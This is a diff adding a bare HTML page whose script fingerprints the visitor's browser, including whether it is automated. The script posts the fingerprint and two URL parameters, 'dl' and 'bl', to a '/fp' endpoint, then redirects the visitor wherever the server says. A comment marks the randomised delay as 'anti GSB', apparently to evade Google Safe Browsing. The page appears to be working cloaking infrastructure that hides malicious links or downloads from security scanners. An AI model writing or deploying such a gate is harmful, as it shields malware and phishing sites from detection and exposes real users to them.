@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+
+async function sendFP() {
+
+  const data = {
+    ua: navigator.userAgent,
+    webdriver: navigator.webdriver,
+    lang: navigator.language,
+    platform: navigator.platform,
+    screen: screen.width + "x" + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+  };
+
+  let params = new URLSearchParams(window.location.search);
+
+  let res = await fetch("/fp", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      fp: data,
+      dl: params.get("dl"),
+      bl: params.get("bl")
+    })
+  });
+
+  let r = await res.json();
+
+  window.location = r.redirect;
+}
+
+// anti GSB delay
+setTimeout(() => {
+  sendFP();
+}, 300 + Math.random()*500);
+
+</script>
+</head>
+<body></body>
+</html>
